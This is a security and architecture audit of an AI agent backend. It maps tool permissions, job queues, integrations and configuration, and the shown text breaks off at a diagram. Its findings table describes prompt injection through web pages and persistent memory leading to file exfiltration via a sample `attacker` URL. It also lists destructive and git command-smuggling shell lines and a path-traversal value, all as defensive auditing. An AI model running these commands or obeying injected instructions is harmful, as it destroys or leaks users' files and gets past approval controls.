# Anemo backend core audit (read-only)

Scope: `backend/app/` except `features/` and `api/`, plus `backend/migrations`, `backend/pyproject.toml`.
All paths below are relative to `backend/` unless noted. Line numbers checked against HEAD `7c4e988`.
Measurements were taken with throwaway scripts that are not part of the repository (metrics, import graph, unreferenced names, sync IO inside async code, the tool table).

---

## 0. Serious items first (security and correctness)

| # | Severity | Item | Where |
|---|---|---|---|
| S1 | **High (default config)** | **Data can leave without approval.** By default the agent may read workspace files (`fs.read` = "workspace", which allows) and `read_web_page` is "ask_dangerous" with risk `safe`, so it runs without asking. So `GET https://attacker/?q=<file contents>` goes out with no approval, and a web page with injected instructions can trigger it. `web_search` (autonomous) is a second channel, through the query string sent to SearXNG. Memory writes are autonomous too, so injected text can also be saved into memory (`memory.write` autonomous), and memory is injected into every later turn. | `policy/presets.py:36-76` (defaults), `tools/builtin/web.py:153-154`, `tools/builtin/memory.py:51` |
| S2 | Medium | **Shell risk classifier rates destructive commands below "dangerous".** At level "ask_dangerous" or "workspace", these run with no approval: `python3 -c "import shutil;shutil.rmtree('/workspace')"`, `perl -e`, `node -e` and `busybox rm -rf /workspace` are all "moderate" (any unknown program is moderate). `git -c core.fsmonitor='<cmd>' status` and `git -c diff.external=<cmd> diff` run any command but rate "safe" (git `-c` options are skipped, then `status`/`diff` are GIT_SAFE). `git log --output=FILE` and `sort -o FILE` write files but rate "safe". The workspace is mounted read-write in both sandboxes, so the sandbox does not protect user files. | `policy/shell_risk.py:390-396` (unknown means moderate), `:515-522` (git `-c` skipped), `:199-223` |
| S3 | Medium | **Shared `egress` Docker network joins every optional container.** `sandbox-net` (agent shell), `mcp-host` (third-party stdio MCP servers), `browser` and `claude-runner` are all on `egress`, which is not internal (`docker-compose.yml` networks section). All their daemons bind `0.0.0.0` (`sandbox/Dockerfile:35`, `mcp-host/Dockerfile:27`, `browser/Dockerfile:26`, `claude-runner/Dockerfile:50`). So an agent shell with network, or a malicious local MCP server, can reach `sandbox-net:7070`, `mcp-host:7080`, `browser:7090` and `claude-runner:7100`. Only the bearer tokens protect them, and runnerd `/health` needs no token (`claude_runner_client.py:91-95` sends none). The "internal network" comments in `claude_runner_client.py:4` and `claude-runner/runnerd/app.py:3` overstate the isolation. `sandbox-net` also has `host.docker.internal:host-gateway`, so `shell.network` reaches the LAN and the Docker host. That skips the private-host allowlist that guards `http_request` and `read_web_page`. | compose `sandbox-net`, `networks:`; `web/safe_http.py` |
| S4 | Medium | **The policy engine fails open on an empty action list.** `combine([])` returns `allow` ("No permission needed"). If any tool, or a future MCP wrapper, returns `[]` from `actions()`, policy is skipped entirely. No current tool does this. Should be deny, or evaluate `tool.capability`. | `policy/engine.py:124-128`, caller `runtime/agent.py:791-803` |
| S5 | Medium | **Trash metadata is trusted, but the sandbox can write it.** `.trash/` sits in the workspace, which is mounted read-write into both sandboxes, so a shell command can edit `.trash/<id>/.meta.json`. `files.restore()` does `shutil.move(slot / meta["name"], target)` without checking `meta["name"]`. A planted name such as `../../../data/...` makes a user-triggered restore move any file the app can read (under `/data`: attachments, backups, tool outputs, keys) into the workspace, where the agent can read it. A malformed `deleted_at` also crashes `list_trash`. | `workspace/files.py:256-294` |
| S6 | Low-Med | **TOCTOU between permission check and execution.** `path_action()` resolves and checks folder access when the call is evaluated. `run()` resolves `args.path` again, possibly a day later after approval. The shell can write the whole workspace, so it can swap in symlinks in between (for example with a background `nohup` loop). `_atomic_write` then writes through a parent that is now a symlink. | `tools/builtin/workspace.py:31-58` vs `:303-330`, `:353-386`; `workspace/files.py:128-137` |
| S7 | Low-Med | **MCP risk comes from server-supplied annotations.** `risk_of()` falls back to `risk_from_hints(tool.annotations)`, so a `readOnlyHint` makes a tool "safe". Under the "ask_dangerous"/"workspace" level for `mcp.*`, a safe tool is allowed without asking, and safe tools are `idempotent`, so they re-run after a crash. Per-tool review (`needs_review`) mitigates this. | `features/mcp/service.py:60-62`, `tools/mcp_tool.py:122-138` |
| S8 | Low | The **agent's SSH private key** is at `/home/agent/.ssh` in `sandbox-net` (compose `sandbox-ssh:/home/agent/.ssh`). The model can `cat` it and send it out with `network=true` (by design, but combine with S1/S2). | compose, `tools/builtin/shell.py:60-71` |
| S9 | Low | `ProviderConfig` is a plain dataclass, so its default `repr` includes `api_key`. `ResolvedModel.config` hides it with `repr=False`, but `ProviderConfig` itself does not. | `providers/base.py:215-223` |
| S10 | Low | A **Redis dump is committed** at repo root (`dump.rdb`, 24 KB, added in 7d0d29f). It holds run event streams from a dev session (`claude-code-check` transcript). Not in `.gitignore`. | repo root |
| S11 | Low | SSRF guard gaps: `is_public()` uses `ip.is_global`, which is True for NAT64 `64:ff9b::a9fe:a9fe` and for IPv4-compatible `::a9fe:a9fe` (both 169.254.169.254). Only exploitable with NAT64 or odd routing. Otherwise the guard is solid: it resolves the address, pins the IP, checks every redirect, denies unix sockets and sets `trust_env=False`. | `web/safe_http.py:67-70` |
| B1 | **High (bug)** | **Runs get stuck as non-terminal.** Only `ProviderError` and `CancelledError` are caught around the agent and chat loops. Anything else (an `AssertionError`, `DecryptionError` from `build_config` when APP_SECRET_KEY changed, the `ValueError` from `make_adapter` when the fake provider is disabled, `KeyError` for an unknown provider type, `OSError` from `outputs.clip`, an exception in a tool's `actions()`, DB errors) goes up to `JobRunner._execute`. That retries the job and then marks only the *job* failed, so the Run stays `queued` or `running` forever, with its message still "streaming". Nothing sweeps such runs. | `runtime/agent.py:1548-1557`, `:1486-1490` (only `NoModelAvailable`), `runtime/chat.py:317-327`, `jobs/runner.py:176-202` |

---

## 1. Tool inventory

### 1.1 How tools are registered (relevant for dead-code checks)

- **Contract**: subclass `Tool` (`tools/base.py:75-96`). The model-facing name is the `name: ClassVar[str]`. Each tool also defines `capability`, an optional `extra_capabilities`, `Input` (a pydantic model whose JSON schema becomes the spec), `idempotent` (whether it may re-run after a crash), `timeout_s` (default 30 s), `actions(args, ctx) -> list[Action]` and `async run()`.
- **Registration is a hand-written list of instances**: `BUILTIN_TOOLS` at `tools/registry.py:39-68`. Some modules contribute lists: `FILE_EXCHANGE_TOOLS`, `DOCUMENT_TOOLS`, `BROWSER_TOOLS`, `TASK_TOOLS`, `PROJECT_TOOLS`, `EVENT_TOOLS`, `FOCUS_TOOLS`, `MEMORY_TOOLS`, `AUTOMATION_TOOLS`. There is no decorator and no auto-discovery. **Tool classes have exactly one reference** (in their module's list or the registry import), so a naive "class used once" dead-code check flags every one of them (false positive).
- **Name-string special cases** (renaming a tool breaks these):
  - `registry.toolset_for`: `"load_skill"`, `"web_search"`, `"run_subagent"`, `"ask_user"`, and `CHAT_FILE_TOOLS = {"save_attachment","attach_file"}` (`tools/registry.py:71`, `:110-121`). Membership tests use `tool in MEMORY_TOOLS / AUTOMATION_TOOLS / BROWSER_TOOLS`.
  - `runtime/agent.py`: `"save_attachment"` (`:323`), `"update_plan"` (`:772`), `"run_subagent"` (`:978`), `isinstance(args, AskUserInput)` (`:757`), `PlanInput` (`:952`).
  - The tools `ask_user` and `run_subagent` have dummy `run()` bodies. The loop handles them itself.
  - `notify.py:258-262` counts earlier calls by `ToolCall.tool_name == self.name`.
  - The frontend references tool names as strings: `run_shell`, `update_plan`, `ask_user`, `attach_file`, `run_subagent`, `list_task_files` and `queue_music` appear in `frontend/src`. Tests reference them too.
- **MCP dynamic tools**: `tools/mcp_tool.py:122-138` builds one class per DB row, `type("McpTool", (McpToolBase,), attrs)()`. The name is `mcp__<server.slug>__<tool>`, shortened with a sha256 suffix when altered or longer than 64 chars (`:33-41`). The capability is `mcp.<slug>.<remote tool name>` (`features/mcp/service.py:65-66`; it uses the raw server-supplied name, which may contain `.`). When a run starts, its MCP tools are snapshotted as (id, schema_hash) pairs (`mcp_tool.snapshot`, `agent.py:1288-1291`). On every resume they are rebuilt with `for_run()` and dropped if the hash changed (`mcp_tool.py:149-159`). They are filtered with a probe evaluation, not through `toolset_for` (`agent.py:1511-1516`).
- **Toolset selection**: `registry.toolset_for()` (`tools/registry.py:86-126`) probes each tool with `Action(capability, resource="", risk="safe")`. Agent mode offers a tool on allow or ask. Chat mode offers only memory tools, and only on allow.
- **Count: 57 built-in tools** (checked by importing `registry.BUILTIN_TOOLS`), plus any number of dynamic MCP tools.

### 1.2 Table

Default decisions come from `compile_policy(PermissionSettings())`, evaluated with a resource for each risk level. "allow" means no approval needed by default. "ask" means it needs approval. Levels come from `policy/presets.py:36-76` and `INTERNAL_RULES` at `:80-89`.

| Tool (model name) | Class file:line | Capability (+extra) | Default level | Default by risk (safe / moderate / dangerous) | Risk the tool reports | Idempotent | Timeout | What it does |
|---|---|---|---|---|---|---|---|---|
| `update_plan` | tools/builtin/plan.py:19 | agent.plan | internal allow | allow | safe | yes | 30s | Visible plan; triggers plan review when `plan_review=always` |
| `ask_user` | tools/builtin/ask.py:26 | agent.ask | internal allow | allow | – | yes | 30s | Runtime turns it into an Approval(kind=question); run() is a dummy |
| `list_files` | tools/builtin/workspace.py:77 | fs.read | workspace | allow/allow/ask | safe | yes | 30s | List folder (hides folders with access "none") |
| `read_file` | tools/builtin/workspace.py:136 | fs.read | workspace | allow/allow/ask | safe | yes | 30s | Text; images as attachment; PDF/Office/zip extraction |
| `find_files` | tools/builtin/workspace.py:250 | fs.read | workspace | allow | safe | yes | 30s | Name search across workspace |
| `write_file` | tools/builtin/workspace.py:279 | fs.write | ask | ask | safe / moderate if it exists | no | 30s | Create or overwrite with backup and FileChange |
| `edit_file` | tools/builtin/workspace.py:340 | fs.write | ask | ask | moderate | no | 30s | Exact string replace |
| `create_folder` | tools/builtin/workspace.py:393 | fs.write | ask | ask | safe | no | 30s | mkdir -p |
| `move_path` | tools/builtin/workspace.py:418 | fs.write | ask | ask | moderate | no | 30s | Move/rename; updates links (features.links) |
| `delete_path` | tools/builtin/workspace.py:456 | fs.delete | ask | ask | moderate; dangerous for folders | no | 30s | Move to `.trash` |
| `save_attachment` | tools/builtin/file_exchange.py:72 | fs.write | ask | ask | safe/moderate | no | 30s | Copy a chat attachment of *this conversation* into workspace |
| `attach_file` | tools/builtin/file_exchange.py:154 | fs.read | workspace | allow | safe | no | 30s | Snapshot workspace files as answer attachments |
| `create_zip` | tools/builtin/file_exchange.py:333 | fs.write (+fs.read) | ask | ask | safe/moderate | no | 300s | Pack files, skipping symlinks and hidden folders |
| `extract_zip` | tools/builtin/file_exchange.py:473 | fs.write (+fs.read) | ask | ask | safe | no | 300s | Unpack with zip-bomb, traversal and symlink guards |
| `list_documents` | tools/builtin/docs.py:62 | fs.read | workspace | allow | safe | yes | 30s | List `documents/` (reconciles the index) |
| `read_document` | tools/builtin/docs.py:96 | fs.read | workspace | allow | safe | yes | 30s | Read a doc in pages |
| `search_documents` | tools/builtin/docs.py:131 | fs.read | workspace | allow | safe | yes | 30s | Full-text/vector search of docs |
| `write_document` | tools/builtin/docs.py:180 | docs.write | ask | ask | safe/moderate | no | 30s | Create/replace doc, with revisions |
| `edit_document` | tools/builtin/docs.py:248 | docs.write | ask | ask | moderate | no | 30s | Edit doc |
| `run_shell` | tools/builtin/shell.py:58 | shell.exec (+shell.network) | ask | ask | from `shell_risk.classify` | no | 3700s | Command in `sandbox` or `sandbox-net` via execd |
| `web_search` | tools/builtin/web.py:67 | net.search | autonomous | allow | safe | yes | 30s | SearXNG |
| `read_web_page` | tools/builtin/web.py:143 | net.fetch | ask_dangerous | allow/allow/ask | safe (moderate for allowlisted private hosts) | yes | 60s | Guarded GET, trafilatura to Markdown |
| `http_request` | tools/builtin/web.py:233 | http.request | ask | ask | safe for GET/HEAD/OPTIONS, else moderate | no | 60s | Any method through the guarded client |
| `browser_open` | tools/builtin/browser.py:132 | browser.use | ask | ask | safe; resource is set to None, so a grant covers the whole session | yes | 100s | browserd action "open" |
| `browser_read` | tools/builtin/browser.py:158 | browser.use | ask | ask | safe | yes | 100s | Re-read or scroll |
| `browser_click` | tools/builtin/browser.py:179 | browser.use | ask | ask | moderate | no | 100s | Click element ref |
| `browser_type` | tools/builtin/browser.py:206 | browser.use | ask | ask | moderate | no | 100s | Type, optionally press Enter |
| `browser_screenshot` | tools/builtin/browser.py:236 | browser.use | ask | ask | safe | yes | 100s | Screenshot as image attachment |
| `list_tasks` | tools/builtin/tasks.py:121 | tasks.read | internal allow | allow | safe | yes | 30s | |
| `get_task` | tools/builtin/tasks.py:169 | tasks.read | internal allow | allow | safe | yes | 30s | |
| `create_task` | tools/builtin/tasks.py:252 | tasks.write | ask_dangerous | allow | safe | no | 30s | |
| `update_task` | tools/builtin/tasks.py:339 | tasks.write | ask_dangerous | allow | safe | no | 30s | |
| `delete_task` | tools/builtin/tasks.py:413 | tasks.write | ask_dangerous | ask | dangerous | no | 30s | |
| `list_task_files` | tools/builtin/tasks.py:441 | tasks.read | internal allow | allow | safe | yes | 30s | |
| `attach_file_to_task` | tools/builtin/tasks.py:468 | tasks.write (+fs.read) | ask_dangerous | allow | safe | yes (it writes, so this is questionable) | 30s | |
| `list_projects` | tools/builtin/projects.py:38 | tasks.read | internal allow | allow | safe | yes | 30s | |
| `create_project` | tools/builtin/projects.py:62 | tasks.write | ask_dangerous | allow | safe | no | 30s | |
| `update_project` | tools/builtin/projects.py:106 | tasks.write | ask_dangerous | allow | safe | no | 30s | |
| `list_events` | tools/builtin/events.py:75 | calendar.read | internal allow | allow | safe | yes | 30s | |
| `create_event` | tools/builtin/events.py:135 | calendar.write | ask_dangerous | allow | safe | no | 30s | |
| `update_event` | tools/builtin/events.py:177 | calendar.write | ask_dangerous | allow | moderate | no | 30s | |
| `delete_event` | tools/builtin/events.py:249 | calendar.write | ask_dangerous | ask (dangerous); one occurrence is moderate, so allow | dangerous/moderate | no | 30s | |
| `get_focus_stats` | tools/builtin/focus.py:81 | focus.read | autonomous | allow | safe | yes | 30s | |
| `list_focus_sessions` | tools/builtin/focus.py:123 | focus.read | autonomous | allow | safe | yes | 30s | |
| `start_focus` | tools/builtin/focus.py:163 | focus.control | ask | ask | safe | no | 30s | Acts in the most recent browser tab (events/presence) |
| `queue_music` | tools/builtin/focus.py:219 | focus.control | ask | ask | safe | no | 30s | |
| `send_notification` | tools/builtin/notify.py:28 | notify.send | ask_dangerous | allow | safe | no | 30s | In-app plus destinations; max 5 per run |
| `remember` | tools/builtin/memory.py:51 | memory.write | autonomous | allow | safe | no | 30s | |
| `update_memory` | tools/builtin/memory.py:110 | memory.write | autonomous | allow | safe | no | 30s | |
| `forget_memory` | tools/builtin/memory.py:147 | memory.write | autonomous | allow (even when dangerous) | moderate/dangerous | no | 30s | |
| `search_memory` | tools/builtin/memory.py:194 | memory.read | internal allow | allow | safe | yes | 30s | |
| `get_automation_state` | tools/builtin/automation.py:23 | automation.state | internal allow | allow | safe | yes | 30s | Only in automation runs |
| `set_automation_state` | tools/builtin/automation.py:50 | automation.state | internal allow | allow | safe | yes | 30s | |
| `get_current_time` | tools/builtin/workspace.py:510 | util.time | internal allow | allow | safe | yes | 30s | (Lives in workspace.py) |
| `load_skill` | tools/builtin/agent.py:19 | util.skill | internal allow | allow | safe | yes | 30s | |
| `run_subagent` | tools/builtin/subagent.py:24 | agent.spawn | **deny** | deny | moderate | no | 30s | Loop spawns a child Run; run() is a dummy |
| `read_tool_output` | tools/builtin/agent.py:52 | util.output | internal allow | allow | safe | yes | 30s | Pages saved outputs of *this run* |
| `mcp__<slug>__<tool>` (dynamic) | tools/mcp_tool.py:80 (base), :122 (build) | mcp.<slug>.<tool> | `mcp.*` = ask, unless a per-tool rule exists | ask | from annotations or override | only when safe | 160s | Remote (HTTP/SSE) direct; stdio through mcp-host |

Hard floor (`policy/engine.py:20`, `:92-102`): `settings.*`, `secrets.*`, `auth.*` are always denied, as are `outside_workspace` and `blocked` actions. No tool uses those prefixes, so the floor only matters for MCP rules or extra rules.

---

## 2. Background jobs and scheduled tasks

### 2.1 Job queue (`jobs/queue.py`, `jobs/runner.py`)
- The queue is a Postgres `jobs` table (`jobs/models.py:11-42`). `claim` uses `FOR UPDATE SKIP LOCKED` (`queue.py:65-86`). The lease is 60 s (`:23`), with a heartbeat every 10 s (`runner.py:26`) and a reaper every 30 s (`runner.py:27`, `queue.py:121-136`). Workers wake on `pg_notify('jobs_new', lane)` through asyncpg LISTEN (`runner.py:133-156`) and also poll every 5 s.
- Backoff in `fail()` is `min(300, 5*2^(attempts-1))` s (`queue.py:107-118`). `max_attempts` defaults to 3. A job claimed more often than `max_attempts` (for example after repeated crashes) is failed without running (`runner.py:179-183`).
- Lanes: `interactive` runs up to `WORKER_CONCURRENCY` jobs and `background` up to `max(1, concurrency//2)` (`runner.py:90`). `priority` exists but **nobody sets it** (always 0).

| Job type | Handler | Enqueued by (file:line) | Lane | max_attempts | Dedupe |
|---|---|---|---|---|---|
| `run.execute` | `runner.py:34` calls `runtime/dispatch.execute_run` (dispatch.py:34), then agent or chat | `features/conversations/service.py:468` (new turn); `features/runs/router.py:266` (resume); `features/runs/agent_router.py:223` (approval answered); `runtime/subagents.py:149` (spawn child); `runtime/subagents.py:210` (wake parent); `features/runs/service.py:124` (approval expired); `features/automations/service.py:277` (automation fire) | interactive (automations and expiry: background) | 3 (default) | none |
| `conversation.title` | `runner.py:37` calls `runtime/chat.generate_title` (chat.py:366) | `runtime/chat.py:350` via `_maybe_enqueue_title` (also called from agent `_after_answer`, agent.py:1621) | background | 3 | `title:{conv}` |
| `memory.extract` | `runner.py:40` calls `features/memory/extraction.extract` | `features/memory/extraction.py:77` (`run_at = now + 2 min` IDLE), called from chat.py:339 and agent.py:1622 | background | 3 | `memory.extract:{conv}:{seq}` (and pre-checked by hand, :75) |
| `memory.reindex` | `runner.py:45` calls `features/memory/service.reindex_all` | `features/memory/router.py:110` | background | 3 | none |
| `document.index` | `runner.py:50` calls `features/documents/service.index_document` | `features/documents/service.py:293` (`run_at = now + 30 s`) | background | 3 | `document.index:{doc}:{hash}` (pre-checked by hand, :291) |
| `notify.deliver` | `runner.py:57` calls `features/notifications/service.deliver` (:444) | `features/notifications/service.py:104` (inside `create`) | background | 5 | none |
| `automation.retry` | `runner.py:62` calls `features/automations/service.retry_run` | `features/automations/service.py:426` (`run_at = now + 2 min * 2^retry`) | background | 1 | none |
| `mcp.refresh` | `runner.py:67` calls `features/mcp/service.refresh` | `features/mcp/service.py:224` | interactive | 3 | none |

Handlers are mapped by string in `default_handlers()` (`runner.py:30-81`, with lazy imports). An unknown type is failed with "no handler".

### 2.2 Periodic tasks (`jobs/scheduler.py:15-30`)
One loop, `TICK_S = 30` (`scheduler.py:12`). The tasks run **one after another** in a single coroutine, so a slow task (the GitHub call) delays the rest.

| Name | Function | Effective interval |
|---|---|---|
| `reminders` | `features/calendar/reminders.py:58 fire_due` | 30 s (GRACE 30 min, LOOKAHEAD 29 d) |
| `automations` | `features/automations/service.py:291 fire_due` | 30 s (GRACE 1 h) |
| `notifications.prune` | `features/notifications/service.py:138 prune` | 30 s (KEEP 90 d) |
| `approvals.expire` | `features/runs/service.py:107 expire_stale_approvals` | 30 s (APPROVAL_TTL 24 h); enqueues `run.execute` |
| `chats.temporary` | `features/conversations/service.py:375 delete_expired_temporary` | 30 s (TEMPORARY_FOR 5 min) |
| `updates.check` | `features/updates/service.py:297 check_if_due` | gated to 24 h (6 h after error) |

Other worker loops (`main_worker.py`):
- `heartbeat_loop` (`:33`) writes `worker:heartbeat:{host}:{pid}` every 10 s with a 45 s TTL. `cli.py worker-health` reads it (`cli.py:29-37`).
- `runner_status_loop` (`:49`) runs every 30 s: `claude_runner_client.publish_status()` writes `claude_runner:status` (TTL 120 s) and `features.parts.publish()` writes `system:parts` (TTL 120 s).

What does **not** exist, despite the prompt's list: digests, any ntfy integration (no `ntfy` string anywhere in the backend), embedding or index cron jobs (indexing is job-driven), and cleanup of the `jobs` table, `DATA_PATH/run-backups` or `DATA_PATH/tool-outputs` (tool outputs are removed only when a conversation is deleted: `features/conversations/service.py:372`). Memory extraction and title generation are jobs, not periodic tasks.

### 2.3 Worker startup sequence (`main_worker.py:67-88`)
1. `get_settings()` (fails fast if APP_SECRET_KEY is shorter than 32 chars outside `env=test`), then `configure_logging`.
2. `worker_id = hostname:pid`. The SIGTERM/SIGINT handlers set `stop`.
3. Background tasks: `heartbeat_loop`, `runner_status_loop`, `scheduler.run`.
4. `await JobRunner(wid, worker_concurrency).run(stop)` starts the two lane loops, the listener and the reaper.
5. Shutdown: wait up to 20 s for running jobs, then cancel them. A cancelled job is `release()`d back to the queue (`runner.py:188-192`). Then the other tasks are cancelled, `dispose_engine()` and `close_redis()` run.

Notes: there is no wait for DB or Redis readiness and no migration check. The worker never imports `app.db.models`, so ORM mapper configuration relies on transitive imports through `runtime.*` (`claude_code_check.py:30` imports `app.db.models` "so the ORM can resolve foreign keys", which shows the issue is real).

---

## 3. Integrations

| Integration | Where | Configuration | HTTP client / timeouts / retries |
|---|---|---|---|
| OpenAI / OpenRouter / OpenAI-compatible (Ollama, vLLM, ...) | `providers/adapters/openai_chat.py` (OpenAIChatAdapter); registry `providers/registry.py:18-58` | Provider row in DB: `type`, `base_url`, key in secrets (`api_key_secret_id`), extra headers JSON in secrets (`headers_secret_id`); defaults per type in `PROVIDER_TYPES` | `openai.AsyncOpenAI(timeout=600, max_retries=0)`; OpenRouter model list uses a bare `httpx.AsyncClient(timeout=30)` (`:250-258`); retries one time without `stream_options` |
| Anthropic | `providers/adapters/anthropic.py` | Same; thinking mode from `provider_options["thinking"]` or `catalog.anthropic_uses_adaptive_thinking` | `anthropic.AsyncAnthropic(timeout=600, max_retries=0)`; 3 cache breakpoints |
| Claude subscription (Claude Code) | `providers/adapters/claude_code.py` (ledger, plan, fork logic) and `claude_runner_client.py`; static model list `providers/claude_code_models.py` | `CLAUDE_RUNNER_URL`, `CLAUDE_RUNNER_TOKEN_FILE`; session ledger in Postgres `claude_code_sessions` (`StateStore`, `:372-406`) | New `httpx.AsyncClient` per call; connect 10 / read 900 s; one `_Retry` to a new session |
| Fake provider | `providers/adapters/fake.py` | `ENABLE_FAKE_PROVIDER` or `ENV=test` (`registry.py:61-63`) | – |
| Model routing | `providers/router.py` (`resolve`, `candidate_ids`) | `app_settings["models"]` (ModelDefaults, in features) | Fallback across candidates is done by `runtime/streaming.py` (2 attempts per model, 1.5 s / 3 s sleeps) |
| Pricing | **No `providers/pricing.py` exists.** Prices are on `Model.pricing` (OpenRouter fills them from discovery); cost is computed in `features/usage/service.record` | – | – |
| MCP client | `mcp/client.py` (remote http/sse through the `mcp` SDK; stdio through mcp-host `POST /tools`, `/call`); tool wrapper `tools/mcp_tool.py` | Server rows in DB (`features/mcp`); `MCP_HOST_URL`, `MCP_HOST_TOKEN_FILE` | Fresh connection per call; connect 30 s, list 60 s, start 200 s, call 120 s |
| SearXNG | `web/search.py` (`SearXNG`), test endpoint `web/router.py` | `app_settings["web"].searxng_url`, falling back to the `SEARXNG_URL` env var (`web/settings.py:38-39`) | Plain `httpx.AsyncClient(timeout=15, follow_redirects=True)`; not SSRF-guarded (user-configured) |
| Web fetch / http_request | `web/fetch.py`, `web/safe_http.py`, `tools/builtin/web.py` | Allowlist `web.allowed_private_hosts` | Guarded transport; 20 s (fetch) or 30 s (http_request); 5 MB / 1 MB caps; max 5 redirects |
| Browser (browserd) | `browser_client.py`, `tools/builtin/browser.py` | `BROWSER_URL`, `BROWSER_TOKEN_FILE`. Also used by the **API** (`features/browser_router.py`, and compose mounts browser-token into `app`), contrary to the "worker only" comment at `core/config.py:67` | timeouts: act 90 s, view 20 s, input 60 s, close 10 s |
| Sandbox execd | `sandbox_client.py`, `tools/builtin/shell.py` | `SANDBOX_URL`, `SANDBOX_NET_URL`, `SANDBOX_TOKEN_FILE`, `SANDBOX_NET_TOKEN_FILE`; SSH key dir `SANDBOX_SSH_DIR` (used by `features/shell/router.py:37`) | Streaming NDJSON; read timeout `timeout_s + 30`; on cancel, `DELETE /exec/{id}` (shielded) |
| mcp-host (hostd) | `mcp/client.py:153-207` | `MCP_HOST_URL`, `MCP_HOST_TOKEN_FILE` | read timeout `timeout_s + START_TIMEOUT_S` |
| Notifications: Discord webhooks, Web Push (VAPID) | `features/notifications/service.py:300` (`send_discord`), `features/notifications/webpush.py` (own RFC 8291/8292 implementation); dispatched by the `notify.deliver` job | Destination rows; webhook URL in secrets; VAPID key created under a pg advisory lock | `SEND_TIMEOUT_S = 15`; 5 attempts through the job queue. **No ntfy.** |
| GitHub update check | `features/updates/service.py:179-234` (`GITHUB_API`, compare endpoint) | `UPDATE_CHECK`, `UPDATE_REPO`, `APP_COMMIT`, `APP_INSTALL` | `TIMEOUT_S`; every 24 h (6 h after an error) |
| Postgres | `core/db.py` (pool 10 + overflow 10, pre_ping); LISTEN uses a raw asyncpg DSN built with `.replace("postgresql+asyncpg://","postgresql://")` (`jobs/runner.py:135`) | `DATABASE_URL` | – |
| Valkey/Redis | `core/redis.py` (decode_responses, no socket timeout, `Retry(ExponentialBackoff(cap=2, base=0.1), 5)`) | `REDIS_URL` | – |

---

## 4. Configuration

### 4.1 `core/config.py` Settings (pydantic-settings; `env_file=None`, `extra="ignore"`; cached by `@lru_cache get_settings()`)

| Field (env var) | Default | Used at |
|---|---|---|
| `env` (ENV) | production | `main_api.py:43` (docs only outside production), `providers/registry.py:62` (fake provider), validator `_check_secret_key` |
| `log_level` | INFO | `main_api.py:38`, `main_worker.py:69` |
| `database_url` | postgresql+asyncpg://aiw:aiw@postgres:5432/aiw | `core/db.py:23`, `jobs/runner.py:135`, `migrations/env.py` |
| `redis_url` | redis://valkey:6379/0 | `core/redis.py:22` |
| `app_secret_key` (SecretStr) | "" (must be at least 32 chars unless env=test) | `core/crypto.py:29` |
| `admin_username`, `admin_password_hash`, `admin_password` | admin / None / None | features/auth only |
| `public_url` | http://localhost:8080 | `api/security.py:42`, `features/notifications/service.py:297`, `webpush.py:199` |
| `cookie_secure`, `session_days` | True / 30 | features/auth |
| **`trusted_proxies`** | "" | **Unused.** Uvicorn reads `FORWARDED_ALLOW_IPS` (compose sets both); only a comment at `api/deps.py:54` |
| **`tz`** | UTC | **Unused** in Python (the user timezone comes from `GeneralSettings.timezone` in the DB). The `.tz` matches in calendar and automations are `datetime.tz`/`tzinfo`, not this setting |
| `workspace_path` | /workspace | `workspace/fs_guard.py:19`, `claude_code_check.py:111`, `features/system_router.py:110` |
| `data_path` | /data | `runtime/outputs.py:22`, `workspace/revert.py:23`, `tools/builtin/workspace.py:63`, `features/attachments/service.py` (5×), `features/system_router.py:111` |
| `static_dir` | /app/static | `main_api.py:53` |
| `app_commit`, `app_install` | "" / source | `features/updates/*`, `features/system_router.py` |
| `update_check`, `update_repo` | True / essntl/anemo | `features/updates/*` |
| `worker_concurrency` | 4 | `main_worker.py:81` |
| `enable_fake_provider` | False | `providers/registry.py:62` |
| `searxng_url` | None | `web/settings.py:39`, `web/router.py:25` |
| `sandbox_url`, `sandbox_net_url` | http://sandbox:7070, http://sandbox-net:7070 | `sandbox_client.py:46` |
| `sandbox_token_file`, `sandbox_net_token_file` | /run/sandbox-token/{sandbox,sandbox-net}/token | `sandbox_client.py:47`, `features/parts.py:26-27` |
| `sandbox_ssh_dir` | /run/sandbox-ssh | `features/shell/router.py:37` |
| `mcp_host_url`, `mcp_host_token_file` | http://mcp-host:7080, /run/mcp-host-token/token | `mcp/client.py:165,171`, `features/parts.py:28` |
| `browser_url`, `browser_token_file` | http://browser:7090, /run/browser-token/token | `browser_client.py:35,43,48`, `features/parts.py:29` |
| `claude_runner_url`, `claude_runner_token_file` | http://claude-runner:7100, /run/claude-runner-token/token | `claude_runner_client.py:38,46,52`, `features/parts.py:30` |

### 4.2 Direct `os.environ` / `os.getenv` reads
- In `backend/app`: **none**. All config goes through `get_settings()`.
- `backend/tests/conftest.py:20-45` reads and writes TEST_DATABASE_URL, DATABASE_URL and REDIS_URL. That is fine.
- Sibling services read their own env (`claude-runner/runnerd/app.py:45,50`, etc.). Out of scope, but note: compose also passes `FORWARDED_ALLOW_IPS` and `TRUSTED_PROXIES` duplicated.

Scattered configuration that is **not** in Settings: many magic constants per module (timeouts and limits). Examples: `ProviderConfig.timeout_s=600` (providers/base.py:223), `ACTION_TIMEOUT_S=90` (browser_client.py:21), MCP timeouts (`mcp/client.py:30-34`), runner read 900 s (`claude_runner_client.py:57`), `LEASE=60s` (queue.py:23), `TICK_S=30` (scheduler.py:12), `CHAT_LIMITS` (agent.py:1251), `ABSOLUTE_MAX_DEPTH/MAX_AT_ONCE/MAX_PER_TASK` (subagents.py:31-33), `MAX_MODEL_CHARS` (outputs.py:15), and the context default `32_000` in three places. User-editable settings live in DB sections (`features/settings`).

### 4.3 Redis keys
| Key | Type | Owner |
|---|---|---|
| `run:{run_id}` | Stream (MAXLEN about 5000, TTL 24 h) | `events/bus.py:43,59-74` |
| `run:{run_id}:control` | pub/sub channel ("cancel") | `events/bus.py:47,101-107` |
| `events:global` | Stream (MAXLEN about 1000, no TTL) | `events/bus.py:39,77-83` |
| `presence:seen`, `presence:active` | ZSET | `events/presence.py:17-18` |
| `worker:heartbeat:{host}:{pid}` | string, TTL 45 s | `main_worker.py:24` (scanned in `cli.py:34` and `features/system_router.py:67`) |
| `claude_runner:status` | string JSON, TTL 120 s | `claude_runner_client.py:22` |
| `system:parts` | string JSON, TTL 120 s | `features/parts.py:18` |
| `login:fail:{ip}`, `login:fail:all` | counters | `features/auth/service.py:80-102` |
| `share:miss:{ip}` | counter | `features/shares/service.py:320-330` |

The convention is `<area>:<sub>:<id>` with colons, but key names are built in five modules with no shared helper or prefix registry. `cli.py:34` hardcodes the heartbeat pattern again instead of using `HEARTBEAT_KEY`. Postgres NOTIFY channel: `jobs_new`.

---

## 5. Run flow architecture

```mermaid
sequenceDiagram
  participant B as Browser
